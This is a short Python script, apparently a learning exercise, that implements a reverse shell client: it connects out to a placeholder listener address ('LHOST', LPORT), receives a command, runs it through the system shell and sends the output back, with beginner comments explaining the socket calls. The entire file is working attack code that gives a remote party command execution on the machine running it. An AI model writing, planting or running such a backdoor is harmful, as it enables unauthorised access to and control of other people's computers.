#!/usr/bin/env python

import socket  # module to connet two systems
import subprocess

def execute_system_command(cmd):
	return subprocess.check_output(cmd , shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# socket(AF_INET referst to the address family ipv4, SOCK_STREAM means connection oriented TCP protocol)

connection.connect(('LHOST', LPORT))
# as connect takes a tuple:(("The IP of listener, Connecting port"))
connection.send("\n[+] Connection has been established\n")  # to send the data

command = connection.recv(1024)  # receiving data
# recv(buffer size)
cmd_result = execute_system_command(command)

connection.send(cmd_result)

connection.close()  #closing the connection